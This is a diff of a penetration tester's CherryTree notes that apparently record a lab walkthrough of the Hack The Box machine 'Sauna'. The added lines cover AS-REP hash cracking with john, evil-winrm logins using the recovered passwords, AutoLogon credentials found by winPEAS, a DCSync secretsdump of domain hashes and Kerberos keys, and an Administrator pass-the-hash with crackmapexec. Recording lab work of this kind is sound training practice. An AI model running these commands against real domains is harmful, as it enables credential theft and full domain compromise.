@@ -17,7 +17,7 @@ Windows Proof: </rich_text>
     <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1697058439">
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1697060715">
       <node name="Nmap" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696874614" ts_lastsave="1696874779">
         <rich_text justification="left"></rich_text>
         <rich_text>
@@ -181,7 +181,9 @@ hbear
 skerb
 
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 we get the following hash
 
@@ -194,15 +196,20 @@ we get the following hash
         <codebox char_offset="500" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:e568ede035eeaba941c01ddd90cc5467$2937e3187eefffea1480b2257f5bf49acb4c35da155a481ed6b8396ade7e68168bd59c34b24fccff207c30fdd274346c242c8aab0423c4cd0f7615fbedb00e008a51809953d0611a0bf7901482626dd8fcaffc34aad6108833fa2bdbebf95bc039508cd8952bc3d9ef4beb94c7d2488bced7d5efe353a490e0d5dc24ec8c40a7415e6684544484d3927228f5624f256a3c115d4fb57d4888a0b0d63012828b88988e40cd2eb6f2561b534b3a6b1c80dc8f2f76c254324b0e844e6dcd96335594af88ed67bf787b5f707b1fa2d0f14d5abbf794cb770675d2140445831bb0977dbee425a6ca735be37d678b4d42611532e06b4ae1ea323497b62c3646be97a9c5
 </codebox>
       </node>
-      <node name="passowrd cracking" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697058439" ts_lastsave="1697058683">
+      <node name="passowrd cracking" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697058439" ts_lastsave="1697059192">
         <rich_text>We now try to crack the hash we got earlier
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 and we get the password Thestrokes23
 
-lets use fsmith and this password with evilwinrm</rich_text>
+lets use fsmith and this password with evilwinrm
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="45" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Sauna  john --wordlist=/usr/share/wordlists/rockyou.txt fsmithHash.log
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
@@ -213,6 +220,100 @@ Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
                    </codebox>
+        <codebox char_offset="137" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Sauna  evil-winrm -i 10.10.10.175 -u fsmith -p "Thestrokes23"</codebox>
+      </node>
+      <node name="privEsc" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697060715" ts_lastsave="1697146026">
+        <rich_text>we grab all the data using blood hound
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+also we run winpeasany.exe as fsmith
+
+
+on running winpeas we found the following :
+
+
+run this to get a shell
+
+
+
+that didn't work on checking out c:\Users
+ we find svc_loanmgr user so lets use that to evilwinrm
+ 
+ 
+
+
+
+
+run sharphound and bloodhound
+
+we see dc sync and hence run the following
+
+run the following:
+
+
+
+
+PS:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+once u get the hash use it
+
+</rich_text>
+        <codebox char_offset="40" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d EGOTISTICAL-BANK.LOCAL --domaincontroller 10.10.10.175</codebox>
+        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+</codebox>
+        <codebox char_offset="155" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.175 -u svc_loanmanager -p Moneymakestheworldgoround!
+</codebox>
+        <codebox char_offset="260" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> evil-winrm -i 10.10.10.175 -u svc_loanmgr -p ‘Moneymakestheworldgoround!'</codebox>
+        <codebox char_offset="367" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:13d3a0e29df0dbfd3f4d7c64ec2fe222:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:cf01803e425f3c7bf3b379db767a518a523f3f3f57cf0fd808c08014b0c3a6c9
+SAUNA$:aes128-cts-hmac-sha1-96:af4532df7fa171e974fb3b9cb04f199f
+SAUNA$:des-cbc-md5:efa868e59dc18c0e
+[*] Cleaning up... 
+                                                                </codebox>
+        <codebox char_offset="399" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Sauna  crackmapexec smb 10.10.10.175 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
+</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
@@ -1936,7 +2037,7 @@ or
 impacket-GetADUsers domain/user:password@IP</codebox>
             <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.10.10.175</codebox>
           </node>
-          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
+          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1697059184">
             <rich_text>
 </rich_text>
             <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
@@ -1944,6 +2045,9 @@ impacket-GetADUsers domain/user:password@IP</codebox>
 
 </rich_text>
             <rich_text justification="left"></rich_text>
+            <rich_text>
+
+</rich_text>
             <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.10.10.175 domain.local/user</codebox>
           </node>
           <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
@@ -2482,7 +2586,7 @@ crackmapexec smb 10.10.10.175 -u admin -p abcd1234 --shares</codebox>
           <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.10.10.175 -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.10.10.175 -M laps</codebox>
           <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.175 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
         </node>
-        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1696645243">
+        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1697060726">
           <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
           <rich_text>
 
@@ -2594,7 +2698,7 @@ To view all the json files generated by the commands above :
 9. click on the joining arrows, select help and then abuse to see how it can be achieved
    
 </rich_text>
-          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.10.10.175</codebox>
+          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d EGOTISTICAL-BANK.LOCAL --domaincontroller 10.10.10.175</codebox>
           <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
           <codebox char_offset="596" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">upload SharpHound.ps1&#13;
 Import-Module ./SharpHound.ps1&#13;
